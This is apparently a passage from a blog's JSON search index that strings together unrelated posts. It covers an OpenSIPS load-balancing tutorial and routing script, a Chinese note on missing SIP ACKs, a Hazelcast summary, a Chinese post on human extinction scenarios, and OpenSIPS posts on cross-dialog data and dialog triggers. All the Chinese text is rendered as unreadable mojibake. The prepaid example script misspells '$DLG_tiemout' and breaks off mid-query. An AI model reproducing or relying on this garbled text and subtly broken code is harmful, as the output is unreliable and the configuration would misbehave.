most loaded resource.\nThe selection algorithm tries to avoid the intensive usage of a resource per box.\n2.4Â Disabling and Pinging The Load Balancer modules provides couple of functionalities to help in dealing with failures of the destinations. The actual detection of a failed destination (based on the SIP traffic) is done in the OpenSIPS routing script by looking at the codes of the replies you receive back from the destinations (see the example at the end of tutorial).Once a destination is detected at failed, in script, you can mark it as disabled via the lb_disable() function - once marked as disabled, the destination will not be used anymore in the LB process (it will not be considered a possible destination when routing calls).For a destination to be set back as enabled, there are two options:\nuse the MI command lb_status to do it manually, from outside OpenSIPS based on probing - the destination must have the SIP probing/pinging enabled - once the destination starts replying with 200 OK replies to the SIP pings (see the probing_reply_codes option. To enable pinging, you need first to set probing_interval to a non zero value - how often the pinging should be done. The pinging will be done by periodically sending a OPTIONS SIP request to the destination - see probing_method option.To control which and when a destination is pinged, there is the probe_mode column in the load_balancer table - see table definition. Possible options are:\n0 no pinging at any time 1 ping only if in disabled state (used for auto re-enabling of destinations) 2 ping all the time - it will disable destination if fails to answer to pings and enable it back when starts answering again. 2.5Â RealTime Control over the Load Balancer The Load Balancer module provides several MI functions to allow you to do runtime changes and to get realtime information from it.Pushing changes at runtime:\nlb_reload - force reloading the entire configuration data from DB - see more.. lb_resize - change the capacity of a resource for a destination - see more.. lb_status - change the status of a destination (enable/disable) - see more.. For fetching realtime information :\nlb_list - list the load on all destinations (per resource) - see more.. lb_status - see the status of a destination (enable/disable) - see more.. 3.Â Study Case: routing the media gateways Here is the full configuration and script for performing LB between media peers.\n3.1Â Configuration Let\u0026rsquo;s consider the following case: a cluster of media servers providing voicemail service and PSTN (in and out) service. So the boxes will be able to receive calls for Voicemail or for PSTN termination, but they will be able to send back calls only for PSTN inbound.\nWe also want the destinations to be disabled from script (when a failure is detected); The re-enabling of the destinations will be done based on pinging - we do pinging only when the destination is in \u0026ldquo;failed\u0026rdquo; status.\n4 destinations/boxes in the LB set\noffers 50 channels for voicemail and 32 for PSTN offers 100 voicemail channels offers 50 voicemail channels offers 10 voicemail and 64 PSTN This translated into the following setup:\nid group_id dst_uri resources prob_mode 1 1 sip:yate1.mycluster.net vm=50; pstn=32 1 2 1 sip:yate2.mycluster.net vm=100 1 3 1 sip:yate3.mycluster.net vm=50 1 4 1 sip:yate4.mycluster.net vm=10;pstn=64 1 3.2Â OpenSIPS Scripting debug=1 memlog=1 fork=yes children=2 log_stderror=no log_facility=LOG_LOCAL0 disable_tcp=yes disable_dns_blacklist = yes auto_aliases=no check_via=no dns=off rev_dns=off listen=udp:xxx.xxx.xxx.xxx:5060 # REPLACE here with right values loadmodule \u0026#34;modules/maxfwd/maxfwd.so\u0026#34; loadmodule \u0026#34;modules/sl/sl.so\u0026#34; loadmodule \u0026#34;modules/db_mysql/db_mysql.so\u0026#34; loadmodule \u0026#34;modules/tm/tm.so\u0026#34; loadmodule \u0026#34;modules/uri/uri.so\u0026#34; loadmodule \u0026#34;modules/rr/rr.so\u0026#34; loadmodule \u0026#34;modules/dialog/dialog.so\u0026#34; loadmodule \u0026#34;modules/mi_fifo/mi_fifo.so\u0026#34; loadmodule \u0026#34;modules/mi_xmlrpc/mi_xmlrpc.so\u0026#34; loadmodule \u0026#34;modules/signaling/signaling.so\u0026#34; loadmodule \u0026#34;modules/textops/textops.so\u0026#34; loadmodule \u0026#34;modules/sipmsgops/sipmsgops.so\u0026#34; loadmodule \u0026#34;modules/load_balancer/load_balancer.so\u0026#34; modparam(\u0026#34;mi_fifo\u0026#34;, \u0026#34;fifo_name\u0026#34;, \u0026#34;/tmp/opensips_fifo\u0026#34;) modparam(\u0026#34;dialog\u0026#34;, \u0026#34;db_mode\u0026#34;, 1) modparam(\u0026#34;dialog\u0026#34;, \u0026#34;db_url\u0026#34;, \u0026#34;mysql://opensips:opensipsrw@localhost/opensips\u0026#34;) modparam(\u0026#34;rr\u0026#34;,\u0026#34;enable_double_rr\u0026#34;,1) modparam(\u0026#34;rr\u0026#34;,\u0026#34;append_fromtag\u0026#34;,1) modparam(\u0026#34;load_balancer\u0026#34;, \u0026#34;db_url\u0026#34;,\u0026#34;mysql://opensips:opensipsrw@localhost/opensips\u0026#34;) # ping every 30 secs the failed destinations modparam(\u0026#34;load_balancer\u0026#34;, \u0026#34;probing_interval\u0026#34;, 30) modparam(\u0026#34;load_balancer\u0026#34;, \u0026#34;probing_from\u0026#34;, \u0026#34;sip:pinger@LB_IP:LB_PORT\u0026#34;) # consider positive ping reply the 404 modparam(\u0026#34;load_balancer\u0026#34;, \u0026#34;probing_reply_codes\u0026#34;, \u0026#34;404\u0026#34;) route{ if (!mf_process_maxfwd_header(\u0026#34;3\u0026#34;)) { send_reply(\u0026#34;483\u0026#34;,\u0026#34;looping\u0026#34;); exit; } if ( has_totag() ) { # sequential request -\u0026gt; obey Route indication loose_route(); t_relay(); exit; } # handle cancel and re-transmissions if ( is_method(\u0026#34;CANCEL\u0026#34;) ) { if ( t_check_trans() ) t_relay(); exit; } # from now on we have only the initial requests if (!is_method(\u0026#34;INVITE\u0026#34;)) { send_reply(\u0026#34;405\u0026#34;,\u0026#34;Method Not Allowed\u0026#34;); exit; } # initial request record_route(); # not really necessary to create the dialog from script (as the # LB functions will do this for us automatically), but we do it # if we want to pass some flags to dialog (pinging, bye, etc) create_dialog(\u0026#34;B\u0026#34;); # check the direction of call if ( lb_is_destination(\u0026#34;$si\u0026#34;,\u0026#34;$sp\u0026#34;,\u0026#34;1\u0026#34;) ) { # call comes from our cluster, so it is an PSNT inbound call # mark it as load on the corresponding destination lb_count_call(\u0026#34;$si\u0026#34;,\u0026#34;$sp\u0026#34;,\u0026#34;1\u0026#34;, \u0026#34;pstn\u0026#34;); # and route is to our main sip server to send call to end user $du = \u0026#34;sip:PROXY_IP:PORXY_PORT\u0026#34;; # REPLACE here with right values t_relay(); exit; } # detect resources and store in an AVP if ( $rU=~\u0026#34;^VM_\u0026#34; ) { # looks like a VoiceMail call $avp(lb_res) = \u0026#34;vm\u0026#34;; } else if ( $rU=~\u0026#34;^[0-9]+$\u0026#34; ) { # PSTN call $avp(lb_res) = \u0026#34;pstn\u0026#34;; } else { send_reply(\u0026#34;404\u0026#34;,\u0026#34;Destination not found\u0026#34;); exit; } # LB function returns negative if no suitable destination (for requested resources) is found, # or if all destinations are full if ( !load_balance(\u0026#34;1\u0026#34;,\u0026#34;$avp(lb_res)\u0026#34;) ) { send_reply(\u0026#34;500\u0026#34;,\u0026#34;Service full\u0026#34;); exit; } xlog(\u0026#34;Selected destination is: $du\\n\u0026#34;); # arm a failure route for be able to catch a failure event and to do # failover to the next available destination t_on_failure(\u0026#34;LB_failed\u0026#34;); # send it out if (!t_relay()) { sl_reply_error(); } } failure_route[LB_failed] { # skip if call was canceled if (t_was_cancelled()) { exit; } # was a destination failure ? (we do not want to do failover # if it was a call setup failure, so we look for 500 and 600 # class replied and for local timeouts) if ( t_check_status(\u0026#34;[56][0-9][0-9]\u0026#34;) || (t_check_status(\u0026#34;408\u0026#34;) \u0026amp;\u0026amp; t_local_replied(\u0026#34;all\u0026#34;) ) ) { # this is a case for failover xlog(\u0026#34;REPORT: LB destination $du failed with code $T_reply_code\\n\u0026#34;); # mark failed destination as disabled lb_disable(); # try to re-route to next available destination if ( !load_balance(\u0026#34;1\u0026#34;,\u0026#34;$avp(lb_res)\u0026#34;) ) { send_reply(\u0026#34;500\u0026#34;,\u0026#34;Service full\u0026#34;); exit; } xlog(\u0026#34;REPORT: re-routing call to $du \\n\u0026#34;); t_relay(); } } ","permalink":"https://wdd.js.org/opensips/blog/load-balance/","summary":"https://opensips.org/Documentation/Tutorials-LoadBalancing-1-9\n1.Â Load Balancing in OpenSIPS The \u0026ldquo;load-balancing\u0026rdquo; module comes to provide traffic routing based on load. Shortly, when OpenSIPS routes calls to a set of destinations, it is able to keep the load status (as number of ongoing calls) of each destination and to choose to route to the less loaded destination (at that moment). OpenSIPS is aware of the capacity of each destination - it is pre-configured with the maximum load accepted by the destinations.","title":"Load Balancing in OpenSIPS"},{"content":"é€šè¿‡sngrepæŠ“åŒ…å‘ç°ï¼Œé€šè¯æ­£å¸¸ï¼ŒACKæ— æ³•é€åˆ°FSã€‚å¯¼è‡´é€šè¯ä¸€æ®µæ—¶é—´åï¼ŒFSå› ä¸ºæ²¡æœ‰æ”¶åˆ°ACKï¼Œå°±å‘é€äº†BYEæ¥æŒ‚æ–­å‘¼å«ã€‚\nsngrepå®šä½åˆ°é—®é¢˜å¯èƒ½å‡ºåœ¨OpenSIPSä¸Šï¼Œç„¶ååˆ†æopensipsçš„æ—¥å¿—ã€‚\nMar 9 16:58:00 dd opensips[84]: ERROR:dialog:dlg_validate_dialog: failed to validate remote contact: dlg=[sip:9999@192.168.2.161:5080;transport=udp] , req =[sip:192.168.2.109:18627;lr;ftag=CX3CDinLARXn1ZRNIlPaFexgirQczdr7;did=4c1.a9657441] ä¸Šé¢çš„æ—¥å¿—ï¼Œæç¤ºé—®é¢˜å‡ºåœ¨dialogéªŒè¯ä¸Šï¼ŒdialogéªŒè¯å¤±è´¥çš„åŸå› å¯èƒ½ä¸contactå¤´æœ‰å…³ã€‚\nç„¶åæˆ‘æœ‰ä»”ç»†çš„åˆ†æäº†ä¸€ä¸‹SIPè½¬åŒ…ã€‚å‘ç°contactä¸­çš„ipåœ°å€192.168.2.161å¹¶ä¸æ˜¯fsçš„åœ°å€ã€‚ä½†æ˜¯å®ƒä¸ºä»€ä¹ˆä¼šå‡ºç°åœ¨fså›çš„200okä¸­å‘¢ï¼Ÿ\nè¿™æ˜¯æˆ‘å°±æƒ³èµ·äº†fs vars.xmlï¼Œå…¶ä¸­æœ‰å‡ ä¸ªå‚æ•°æ˜¯ç”¨æ¥é…ç½®æœåŠ¡å™¨çš„ipåœ°å€çš„ã€‚\nç”±äºæˆ‘çš„fsæ˜¯ä¸ªæ ‘è“æ´¾ï¼Œipæ˜¯è‡ªåŠ¨åˆ†é…çš„ï¼Œé‡å¯ä¹‹åï¼Œå¯èƒ½è·å–äº†æ–°çš„ipã€‚ä½†æ˜¯è€çš„ipåœ°å€ï¼Œè¿˜æ˜¯å­˜åœ¨äºvars.xmlä¸­ã€‚\nç„¶åæˆ‘å°±å»æ’æŸ¥äº†ä¸€ä¸‹fsçš„var.xmlï¼Œ å‘ç°ä¸‹é¢ä¸‰ä¸ªå‚æ•°éƒ½æ˜¯192.168.2.161ï¼Œ ä½†æ˜¯å®é™…ä¸Šæ ‘è“æ´¾çš„åœ°å€å·²ç»ä¸æ˜¯è¿™ä¸ªäº†ã€‚\nbind_server_ip external_rtp_ip external_sip_ip è§£å†³æ–¹æ¡ˆï¼šæ”¹å˜fs vars.xmlä¸­çš„åœ°å€é…ç½®ä¿¡æ¯ï¼Œç„¶åé‡å¯fsã€‚\né™¤äº†fsçš„åŸå› ï¼Œè¿˜æœ‰ä¸€éƒ¨åˆ†åŸå› å¯èƒ½æ˜¯é”™è¯¯çš„ä½¿ç”¨äº†fix_nated_contactã€‚**åŠ¡å¿…è®°ä½ï¼šå¯¹äºä½äºè¾¹ç•Œçš„SIPæœåŠ¡å™¨æ¥è¯´ï¼Œå¯¹äºè¿›å…¥çš„SIPè¯·æ±‚ï¼Œä¸€èˆ¬éœ€è¦fix_nated_contacedã€‚å¯¹äºè¿™ä¸ªè¯·æ±‚çš„å“åº”ï¼Œåˆ™ä¸éœ€è¦è¿›è¡Œnatå¤„ç†ã€‚\næ·±å…¥æ€è€ƒä¸€ä¸‹ï¼Œä¸ºä»€ä¹ˆconcactå¤´ä¿®æ”¹çš„é”™äº†ï¼Œå¾€å¾€ackå°±ä¼šæœ‰é—®é¢˜å‘¢ï¼Ÿ å®é™…ä¸Šackè¯·æ±‚çš„urléƒ¨åˆ†ï¼Œå°±æ˜¯ç”±å“åº”æ¶ˆæ¯çš„contactå¤´çš„ulréƒ¨åˆ†ã€‚\n","permalink":"https://wdd.js.org/opensips/ch7/miss-ack/","summary":"é€šè¿‡sngrepæŠ“åŒ…å‘ç°ï¼Œé€šè¯æ­£å¸¸ï¼ŒACKæ— æ³•é€åˆ°FSã€‚å¯¼è‡´é€šè¯ä¸€æ®µæ—¶é—´åï¼ŒFSå› ä¸ºæ²¡æœ‰æ”¶åˆ°ACKï¼Œå°±å‘é€äº†BYEæ¥æŒ‚æ–­å‘¼å«ã€‚\nsngrepå®šä½åˆ°é—®é¢˜å¯èƒ½å‡ºåœ¨OpenSIPSä¸Šï¼Œç„¶ååˆ†æopensipsçš„æ—¥å¿—ã€‚\nMar 9 16:58:00 dd opensips[84]: ERROR:dialog:dlg_validate_dialog: failed to validate remote contact: dlg=[sip:9999@192.168.2.161:5080;transport=udp] , req =[sip:192.168.2.109:18627;lr;ftag=CX3CDinLARXn1ZRNIlPaFexgirQczdr7;did=4c1.a9657441] ä¸Šé¢çš„æ—¥å¿—ï¼Œæç¤ºé—®é¢˜å‡ºåœ¨dialogéªŒè¯ä¸Šï¼ŒdialogéªŒè¯å¤±è´¥çš„åŸå› å¯èƒ½ä¸contactå¤´æœ‰å…³ã€‚\nç„¶åæˆ‘æœ‰ä»”ç»†çš„åˆ†æäº†ä¸€ä¸‹SIPè½¬åŒ…ã€‚å‘ç°contactä¸­çš„ipåœ°å€192.168.2.161å¹¶ä¸æ˜¯fsçš„åœ°å€ã€‚ä½†æ˜¯å®ƒä¸ºä»€ä¹ˆä¼šå‡ºç°åœ¨fså›çš„200okä¸­å‘¢ï¼Ÿ\nè¿™æ˜¯æˆ‘å°±æƒ³èµ·äº†fs vars.xmlï¼Œå…¶ä¸­æœ‰å‡ ä¸ªå‚æ•°æ˜¯ç”¨æ¥é…ç½®æœåŠ¡å™¨çš„ipåœ°å€çš„ã€‚\nç”±äºæˆ‘çš„fsæ˜¯ä¸ªæ ‘è“æ´¾ï¼Œipæ˜¯è‡ªåŠ¨åˆ†é…çš„ï¼Œé‡å¯ä¹‹åï¼Œå¯èƒ½è·å–äº†æ–°çš„ipã€‚ä½†æ˜¯è€çš„ipåœ°å€ï¼Œè¿˜æ˜¯å­˜åœ¨äºvars.xmlä¸­ã€‚\nç„¶åæˆ‘å°±å»æ’æŸ¥äº†ä¸€ä¸‹fsçš„var.xmlï¼Œ å‘ç°ä¸‹é¢ä¸‰ä¸ªå‚æ•°éƒ½æ˜¯192.168.2.161ï¼Œ ä½†æ˜¯å®é™…ä¸Šæ ‘è“æ´¾çš„åœ°å€å·²ç»ä¸æ˜¯è¿™ä¸ªäº†ã€‚\nbind_server_ip external_rtp_ip external_sip_ip è§£å†³æ–¹æ¡ˆï¼šæ”¹å˜fs vars.xmlä¸­çš„åœ°å€é…ç½®ä¿¡æ¯ï¼Œç„¶åé‡å¯fsã€‚\né™¤äº†fsçš„åŸå› ï¼Œè¿˜æœ‰ä¸€éƒ¨åˆ†åŸå› å¯èƒ½æ˜¯é”™è¯¯çš„ä½¿ç”¨äº†fix_nated_contactã€‚**åŠ¡å¿…è®°ä½ï¼šå¯¹äºä½äºè¾¹ç•Œçš„SIPæœåŠ¡å™¨æ¥è¯´ï¼Œå¯¹äºè¿›å…¥çš„SIPè¯·æ±‚ï¼Œä¸€èˆ¬éœ€è¦fix_nated_contacedã€‚å¯¹äºè¿™ä¸ªè¯·æ±‚çš„å“åº”ï¼Œåˆ™ä¸éœ€è¦è¿›è¡Œnatå¤„ç†ã€‚\næ·±å…¥æ€è€ƒä¸€ä¸‹ï¼Œä¸ºä»€ä¹ˆconcactå¤´ä¿®æ”¹çš„é”™äº†ï¼Œå¾€å¾€ackå°±ä¼šæœ‰é—®é¢˜å‘¢ï¼Ÿ å®é™…ä¸Šackè¯·æ±‚çš„urléƒ¨åˆ†ï¼Œå°±æ˜¯ç”±å“åº”æ¶ˆæ¯çš„contactå¤´çš„ulréƒ¨åˆ†ã€‚","title":"ACK æ— æ³•æ­£å¸¸é€åˆ°FS"},{"content":"","permalink":"https://wdd.js.org/posts/2021/03/ewinve/","summary":"","title":"stompjs å¿ƒè·³æœºåˆ¶è°ƒç ”"},{"content":"IDMGæ˜¯ IN-MEMORY DATA GRIDçš„ç¼©å†™ã€‚\nå®˜æ–¹çš„ä¸€å¥è¯ä»‹ç»ï¼š\nThe industry\u0026rsquo;s fastest, most scalable in-memory data grid, where speed, scalability and continuous processing are the core requirements for deployment.\næŠ½å–å…³é”®è¯ï¼š\nå¿« å¯ä¼¸ç¼© å†…å­˜ åˆ†å¸ƒå¼ ç®€ä»‹ An IMDG (in-memory data grid) is a set of networked/clustered computers that pool together their random access memory (RAM) to let applications share data structures with other applications running in the cluster.\nThe primary advantage is speed, which has become critical in an environment with billions of mobile, IoT devices and other sources continuously streaming data. With all relevant information in RAM in an IMDG, there is no need to traverse a network to remote storage for transaction processing. The difference in speed is significant â€“ minutes vs. sub-millisecond response times for complex transactions done millions of times per second.\nå‚è€ƒ https://hazelcast.com/products/imdg/ ç®¡ç†ä¸­å¿ƒ https://github.com/hazelcast/management-center-docker https://github.com/hazelcast/hazelcast-docker https://github.com/hazelcast/hazelcast-nodejs-client/blob/master/DOCUMENTATION.md https://docs.hazelcast.com/imdg/latest/clusters/discovering-by-tcp.html æ–‡æ¡£ https://docs.hazelcast.com/imdg/latest/clusters/discovering-by-tcp.html ","permalink":"https://wdd.js.org/posts/2021/02/xlwnvv/","summary":"IDMGæ˜¯ IN-MEMORY DATA GRIDçš„ç¼©å†™ã€‚\nå®˜æ–¹çš„ä¸€å¥è¯ä»‹ç»ï¼š\nThe industry\u0026rsquo;s fastest, most scalable in-memory data grid, where speed, scalability and continuous processing are the core requirements for deployment.\næŠ½å–å…³é”®è¯ï¼š\nå¿« å¯ä¼¸ç¼© å†…å­˜ åˆ†å¸ƒå¼ ç®€ä»‹ An IMDG (in-memory data grid) is a set of networked/clustered computers that pool together their random access memory (RAM) to let applications share data structures with other applications running in the cluster.\nThe primary advantage is speed, which has become critical in an environment with billions of mobile, IoT devices and other sources continuously streaming data.","title":"hazelcast IDMG"},{"content":"","permalink":"https://wdd.js.org/posts/2021/02/egkbht/","summary":"","title":"macbook pro 1708 æ¢ç”µæ± è®°å½•"},{"content":"äººç±»å°†ä»¥ä»€ä¹ˆæ–¹å¼èµ°å‘ç­ç»ï¼Œå¾ˆå¤šç§‘å¹»ç”µå½±ä¸­éƒ½æœ‰è¿‡è®¾æƒ³ã€‚\næœ€è¿‘è¯»åˆ°ä¸€æœ¬ä¹¦ã€Šäººç±»ç­ç»ã€‹æ¥è‡ªæ—¥æœ¬ä½œå®¶é«˜é‡å’Œæ˜çš„ç§‘å¹»å°è¯´ç»™å‡ºç³»ç»Ÿçš„ä»‹ç»ã€‚å°è¯´ä¸­æœ‰ä¸€ä»½æŠ¥å‘Šï¼Œå«åšã€Šæµ·æ–¯æ›¼æŠ¥å‘Šã€‹ã€‚\nä¸‹é¢è¡¨æ ¼ä¸­çš„1-5æ˜¯æŠ¥å‘Šä¸­æåˆ°çš„äººç±»ç­ç»æ–¹å¼ï¼Œ6-7æ˜¯æˆ‘è‡ªå·±æ·»åŠ ã€‚\nç§ç±» ç±»åˆ« ä¸¾ä¾‹ ç›¸å…³ç”µå½±ï¼Œæˆ–è€…ä¹¦ç± 1 å®‡å®™è§„æ¨¡çš„ç¾éš¾ å°è¡Œæ˜Ÿæ’åœ°çƒï¼Œå¤ªé˜³ç‡ƒå°½ 2 åœ°çƒè§„æ¨¡çš„ç¯å¢ƒå˜åŠ¨ åœ°çƒç£åœºçš„å—åŒ—é€†è½¬ç°è±¡ï¼Œç¯å¢ƒæ±¡æŸ“ ã€Š2012ã€‹ã€Šåå¤©ã€‹ 3 æ ¸æˆ˜ äºŒæˆ˜ æ—¥æœ¬ æ ¸æ­¦å™¨ 4 ç–«ç—… ç—…æ¯’å¨èƒ ç”Ÿç‰©æ­¦å™¨ ç”µå½±ç”ŸåŒ–å±æœºï¼Œä»Šå¹´çš„æ–°å† è‚ºç‚ç–«æƒ…ï¼ŒHIV ã€Šç”ŸåŒ–å±æœºã€‹ã€Šè¡Œå°¸èµ°è‚‰ã€‹ 5 äººç±»è¿›åŒ– ç”±äºåŸºå› çªå˜ï¼Œäº§ç”Ÿæ›´åŠ æ™ºèƒ½çš„äººç±» ã€Šä¸œäº¬é£Ÿå°¸é¬¼ã€‹ã€Šäººç±»ç­ç»ã€‹ 6 AIå¤±æ§ äººå·¥æ™ºèƒ½å‡ºç°è‡ªæˆ‘æ„è¯† ã€Šæˆ‘ï¼Œæœºå™¨äººã€‹ã€Šç»ˆç»“è€…ç³»åˆ—ã€‹ã€Šé»‘å®¢å¸å›½ç³»åˆ—ã€‹ 7 å¤–æ˜Ÿäººå…¥ä¾µ é«˜å±‚æ¬¡æ–‡æ˜å…¥ä¾µä½å±‚æ¬¡æ–‡æ˜ ã€Šä¸‰ä½“ã€‹ äºä¸‰ä½“ä¸åŒçš„æ˜¯ï¼Œä½œè€…ä»äººç±»ç¬¬5ç§å¯èƒ½æ€§å±•å¼€å°è¯´ã€‚å¦‚æœä½ å–œæ¬¢ä¸‰ä½“çš„è¯ï¼Œã€Šäººç±»ç­ç»ã€‹è¿™æœ¬å°è¯´ï¼Œä¹Ÿæ˜¯éå¸¸å€¼å¾—ä¸€è¯»çš„ã€‚\n","permalink":"https://wdd.js.org/posts/2021/02/ploder/","summary":"äººç±»å°†ä»¥ä»€ä¹ˆæ–¹å¼èµ°å‘ç­ç»ï¼Œå¾ˆå¤šç§‘å¹»ç”µå½±ä¸­éƒ½æœ‰è¿‡è®¾æƒ³ã€‚\næœ€è¿‘è¯»åˆ°ä¸€æœ¬ä¹¦ã€Šäººç±»ç­ç»ã€‹æ¥è‡ªæ—¥æœ¬ä½œå®¶é«˜é‡å’Œæ˜çš„ç§‘å¹»å°è¯´ç»™å‡ºç³»ç»Ÿçš„ä»‹ç»ã€‚å°è¯´ä¸­æœ‰ä¸€ä»½æŠ¥å‘Šï¼Œå«åšã€Šæµ·æ–¯æ›¼æŠ¥å‘Šã€‹ã€‚\nä¸‹é¢è¡¨æ ¼ä¸­çš„1-5æ˜¯æŠ¥å‘Šä¸­æåˆ°çš„äººç±»ç­ç»æ–¹å¼ï¼Œ6-7æ˜¯æˆ‘è‡ªå·±æ·»åŠ ã€‚\nç§ç±» ç±»åˆ« ä¸¾ä¾‹ ç›¸å…³ç”µå½±ï¼Œæˆ–è€…ä¹¦ç± 1 å®‡å®™è§„æ¨¡çš„ç¾éš¾ å°è¡Œæ˜Ÿæ’åœ°çƒï¼Œå¤ªé˜³ç‡ƒå°½ 2 åœ°çƒè§„æ¨¡çš„ç¯å¢ƒå˜åŠ¨ åœ°çƒç£åœºçš„å—åŒ—é€†è½¬ç°è±¡ï¼Œç¯å¢ƒæ±¡æŸ“ ã€Š2012ã€‹ã€Šåå¤©ã€‹ 3 æ ¸æˆ˜ äºŒæˆ˜ æ—¥æœ¬ æ ¸æ­¦å™¨ 4 ç–«ç—… ç—…æ¯’å¨èƒ ç”Ÿç‰©æ­¦å™¨ ç”µå½±ç”ŸåŒ–å±æœºï¼Œä»Šå¹´çš„æ–°å† è‚ºç‚ç–«æƒ…ï¼ŒHIV ã€Šç”ŸåŒ–å±æœºã€‹ã€Šè¡Œå°¸èµ°è‚‰ã€‹ 5 äººç±»è¿›åŒ– ç”±äºåŸºå› çªå˜ï¼Œäº§ç”Ÿæ›´åŠ æ™ºèƒ½çš„äººç±» ã€Šä¸œäº¬é£Ÿå°¸é¬¼ã€‹ã€Šäººç±»ç­ç»ã€‹ 6 AIå¤±æ§ äººå·¥æ™ºèƒ½å‡ºç°è‡ªæˆ‘æ„è¯† ã€Šæˆ‘ï¼Œæœºå™¨äººã€‹ã€Šç»ˆç»“è€…ç³»åˆ—ã€‹ã€Šé»‘å®¢å¸å›½ç³»åˆ—ã€‹ 7 å¤–æ˜Ÿäººå…¥ä¾µ é«˜å±‚æ¬¡æ–‡æ˜å…¥ä¾µä½å±‚æ¬¡æ–‡æ˜ ã€Šä¸‰ä½“ã€‹ äºä¸‰ä½“ä¸åŒçš„æ˜¯ï¼Œä½œè€…ä»äººç±»ç¬¬5ç§å¯èƒ½æ€§å±•å¼€å°è¯´ã€‚å¦‚æœä½ å–œæ¬¢ä¸‰ä½“çš„è¯ï¼Œã€Šäººç±»ç­ç»ã€‹è¿™æœ¬å°è¯´ï¼Œä¹Ÿæ˜¯éå¸¸å€¼å¾—ä¸€è¯»çš„ã€‚","title":"äººç±»ç­ç»çš„7ç§æ–¹å¼"},{"content":"åŸæ–‡ï¼šhttps://blog.opensips.org/2020/05/18/cross-dialog-data-accessing/\nThere are several calling scenarios â€“ typical Class V â€“ where multiple SIP dialogs may be involved. And to make it work, you need, from one dialog, to access the data that belongs to another dialog. By data we mean here dialog specific data, like dialog variables, profiles or flags, and, even more, accounting data (yes, the accounting engine is so powerful that it ended be used for storing a lot of information during the calls).Letâ€™s take a quick look at a couple of such scenarios:\nattended call transfer â€“ the new call may need to import data (about the involved parties) from the old dialog; call parking â€“ the retrieving call will need to import a lot of data (again, about the parties involved and the nature of the call) from the parked call call pickup â€“ the picking up call will also have to access data from the ringing calls in order to find them, check permissions and grab one call. Scratching the surface, before OpenSIPS 3.1 The pre 3.1 OpenSIPS versions had some limited possibilities when comes to accessing the data from other dialogs.Historically speaking, the first attempt was the get_dialog_info() function, a quite primitive approach that allows you, using the dialog variables, to find a dialog and to retrieve from it only one dialog variable. Even so, this function served the purpose of addressing scenarios where you wanted to group dialogs around custom values â€“ this solved the problem of a front-end OpenSIPS balancer trying to group all calls of a conf room on the same conf server, or trying to group the calls of a user on the same PBX (so call transfer will work).But there were some**_Â limitations in terms of scalability_** (only one value was retrieved) and usage, on how the dialogs were referred (by dlg variables, not by the more natural call-id).So we had the next wave of functions that addressed that issues : the get_dialog_vals(), get_dialogs_by_val() or get_dialogs_by_profile() functions. They solved somehow the problem allowing a more versatile way of referring/identifying the dialogs and allowing a bulk access to the dialog data, but still, not all dialog data was accessible and the the way the data was returned (it complex arrays or json strings) makes them**_Â difficult to use_**.\nThe true solution, with OpenSPIS 3.1 So back to the drawing board. And the correct solution to the problem (of inter dialog data accessing) come from a totally different, much simpler approach â€“ give direct access to the dialog context, so every piece of dialog data will be accessible via the regular dialog functions/variables/profiles/flags/etc/.So, OpenSIPS 3.1 gives you the possibility to load the context of a different dialog, so you can retrieve whatever data without the need of additional functions or special data packing or re-formatting.Two simple functions were added, the load_dialog_ctx() and unload_dialog_ctx(). These two functions may be used to define a region in your script where â€œyou seeâ€ a different dialog than the current one (dictated by the SIP traffic). Inside that region, all the dialog functions and variables will operate on the other dialog. Simple and very handy, right ?To make it even better, the OpenSIPS 3.1 gives you more than only the access to another dialog context â€“ it gives you the possibility to**_Â access the accounting context of another call_**. Shortly, you can access the accounting variables (extra data or per-leg data) of a different call â€“ isnâ€™t that cool ?This can be done via the acc_load_ctx_from_dlg() and acc_unload_ctx_from_dlg() functions, in the similar way to the loading/unloading the dialog context. Inside the region defined by these new accounting function, you will â€œseeâ€ the accounting data of another call.\nExample Letâ€™s take the example of an attended transfer, when handling the transferring call. This snippet will show we can get access to various dialog and accounting data from the transferred dialog , while handling the transferring dialog.\n","permalink":"https://wdd.js.org/opensips/blog/cross-dialog-data/","summary":"åŸæ–‡ï¼šhttps://blog.opensips.org/2020/05/18/cross-dialog-data-accessing/\nThere are several calling scenarios â€“ typical Class V â€“ where multiple SIP dialogs may be involved. And to make it work, you need, from one dialog, to access the data that belongs to another dialog. By data we mean here dialog specific data, like dialog variables, profiles or flags, and, even more, accounting data (yes, the accounting engine is so powerful that it ended be used for storing a lot of information during the calls).","title":"Cross-dialog data accessing"},{"content":"åŸæ–‡ï¼šhttps://blog.opensips.org/2020/05/26/dialog-triggers-or-how-to-control-the-calls-from-script/\nThe OpenSIPS script is a very powerful tool, both in terms of capabilities (statements, variables, transformations) and in terms of integration (support for DB, REST, Events and more).So why not using the OpenSIPS script (or the script routes) to interact and control your call, in order to build more complex services on top of the dialog support?For this purpose, OpenSIPS 3.1 introduces three new per-dialog triggers:\non_answer route, triggered when the dialog is answered; on_timeout route, triggered when the dialog is about to timeout; on_hangup route, triggered after the dialog was terminated. The routes are optional and per-dialog and they give you the possibility to attach custom operations to the various critical milestones in a dialog life.While the on_answer and on_hangup routes are 100% data-manipulation oriented (you have full read/write access to the full data context of the dialog, but you cannot change anything about the dialog progress), the on_timeout route is a bit more versatile â€“ by increasing the dialogâ€™s timeout, you can dynamically increase the dialog lifetime (to postpone the dialog timeout, without waiting for any signalling to do it).But letâ€™s talk example ğŸ™‚\nSimple PrePaid Using the on_timeout route, we can simulate the incremental check and charge behavior of a basic prepaid.For example, we set 5 seconds timeout for the dialog and when the on_timeout route is triggered (after the 5 secs), we can re-check if the caller still have credit to continue the call. If not, we leave the call to timeout, to be terminated by the OpenSIPS. If he still has credit, we deduct the cost for 5 secs more and we increase the dialog timeout is 5 more seconds. Simple, right ?\nroute { .... create_dialog(\u0026#34;B\u0026#34;); # remember some billing account id, to remember # where to check for credit $dlg_val(account_id) = \u0026#34;...\u0026#34;; # keep a running cost for the call also $dlg_val(total_cost) = 0; # start with an initial 5 seconds duration $DLG_tiemout = 5; t_on_timeout(\u0026#34;call_recheck\u0026#34;); t_on_hangup(\u0026#34;call_terminated\u0026#34;); .... } route[call_recheck] { # the dialog data (vars, flags, profiles) are accesible here. xlog(\u0026#34;[$DLG_id] dialog timeout triggered\\n\u0026#34;); # calculate the cost for the next 5 seconds $var(cost) = 5 * .... ; # use a critical/locked region to do test and update upon the credit get_dynamic_lock( \u0026#34;$dlg_val(account_id)\u0026#34; ); if (avp_db_query(\u0026#34;select credit from accounts where credit\u0026gt;=$var(cost) and id=$dlg_val(account_id)\u0026#34;)) { # credit is stil available avp_db_query(\u0026#34;update accounts set 